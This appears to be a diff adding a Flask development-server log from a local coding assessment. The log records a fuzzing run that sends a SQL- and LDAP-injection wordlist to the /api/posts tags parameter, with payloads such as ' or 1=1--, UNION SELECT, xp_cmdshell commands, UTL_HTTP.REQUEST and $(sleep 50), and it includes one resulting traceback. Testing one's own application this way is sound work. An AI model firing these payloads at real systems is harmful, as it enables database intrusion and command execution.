@@ -1,0 +1,146 @@
+ * Serving Flask app './backend_assessment/index.py' (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+ * Running on all addresses.
+   WARNING: This is a development server. Do not use it in a production deployment.
+ * Running on http://10.0.2.15:5000/ (Press CTRL+C to quit)
+127.0.0.1 - - [11/Mar/2022 15:56:49] "GET /api/posts?tags= HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:49] "GET /api/posts?tags==%20' HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:49] "GET /api/posts?tags=" HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:49] "GET /api/posts?tags=' HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:49] "GET /api/posts?tags='%20-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:49] "GET /api/posts?tags=- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:49] "GET /api/posts?tags==%20; HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:49] "GET /api/posts?tags='%20; HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags==%20-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=--'; HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=\x23 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=\x3D%20\x27 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=\x3D%20\x3B' HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=\x27 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=\x27\x4F\x52%20SELECT%20* HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=admin'-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=\x27\x6F\x72%20SELECT%20* HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='or%20select%20* HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=<>"'%;)(&+ HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='%20or%20''=' HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='%20or%20'x'='x HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags="%20or%20"x"="x HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=')%20or%20('x'='x HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=0%20or%201=1 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags="%20or%200=0%20-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=or%200=0%20-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='%20or%200=0%20 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='%20or%200=0%20-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags="%20or%200=0%20 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=or%200=0%20 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags="%20or%201=1-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='%20or%201=1-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='%20or%20'1'='1'-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags="'%20or%201%20--'" HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='%20or%201=1%20or%20''=' HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=or%201=1 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=or%201=1-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=or%201=1%20-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='%20or%20a=a-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags="%20or%201=1%20or%20""=" HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=')%20or%20('a'='a HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=")%20or%20("a"="a HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=hi"%20or%20"a"="a HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags="%20or%20"a"="a HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=hi'%20or%20'a'='a HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=hi'%20or%201=1%20-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=hi"%20or%201=1%20-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=hi')%20or%20('a'='a HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=hi")%20or%20("a"="a HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags='hi'%20or%20'x'='x'; HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=,@variable HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=@variable HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=select HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=insert HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=as HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=limit HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=or HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=procedure HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=asc HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:50] "GET /api/posts?tags=order%20by HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=desc HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=delete HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=distinct HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=update HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=PRINT%20@@variable HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=PRINT HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=replace HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=like HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=bfilename HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=handler HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20or%20uname%20like%20'% HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20or%20username%20like%20'% HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20or%20uid%20like%20'% HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20or%20userid%20like%20'% HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20or%20user%20like%20'% HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=exec%20xp HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=exec%20sp HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=';%20exec%20master..xp_cmdshell HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=having HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=truncate HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=t'exec%20master..xp_cmdshell%20'nslookup%20www.google.com'-- HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=\x27UNION%20SELECT HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=--sp_password HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=&lt;&gt;&quot;'%;)(&amp;+ HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20UNION%20SELECT HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20UNION%20ALL%20SELECT HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20or%20(EXISTS) HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20(select%20top%201 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=1;SELECT%20* HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=&apos;%20OR HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=';%20exec%20xp_regread HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='%20or%201=1 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=tz_offset HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=%27%20or%201=1 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=to_timestamp_tz HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='||UTL_HTTP.REQUEST HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=%20$(sleep%2050) HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=char%4039A%2b%40SELECT HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=%20'sleep%2050' HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags='sqlattempt1 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=(sqlattempt2) HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=%2A%7C HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=*| HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=%2A%28%7C%28mail%3D%2A%29%29 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags= HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:51] "GET /api/posts?tags=*(|(mail=*)) HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=| HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=%7C HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=*(|(objectclass=*)) HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=%2A%28%7C%28objectclass%3D%2A%29%29 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=( HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=) HTTP/1.1" 200 -
+[2022-03-11 15:56:52,155] ERROR in app: Exception on /api/posts [GET]
+Traceback (most recent call last):
+  File "/home/maximillian/.local/share/virtualenvs/assessment-SfVlbHV2/lib/python3.8/site-packages/flask/app.py", line 2073, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/maximillian/.local/share/virtualenvs/assessment-SfVlbHV2/lib/python3.8/site-packages/flask/app.py", line 1518, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/maximillian/.local/share/virtualenvs/assessment-SfVlbHV2/lib/python3.8/site-packages/flask/app.py", line 1516, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/maximillian/.local/share/virtualenvs/assessment-SfVlbHV2/lib/python3.8/site-packages/flask/app.py", line 1502, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/maximillian/Documents/repositories/0day/Challenges/Walnut/assessment/backend_assessment/index.py", line 71, in posts
+    noneDump = [results.append(post) for post in r.json()['posts'] if post not in results] # Should take care of duplicates
+KeyError: 'posts'
+127.0.0.1 - - [11/Mar/2022 15:56:52] "[35m[1mGET /api/posts?tags=%26 HTTP/1.1[0m" 500 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=%29 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=! HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=%21 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags='%20or%201=1%20or%20''=' HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags='%20or%20''=' HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=/ HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=// HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=//* HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=*/* HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=%28 HTTP/1.1" 200 -
+127.0.0.1 - - [11/Mar/2022 15:56:52] "GET /api/posts?tags=x'%20or%201=1%20or%20'x'='y HTTP/1.1" 200 -
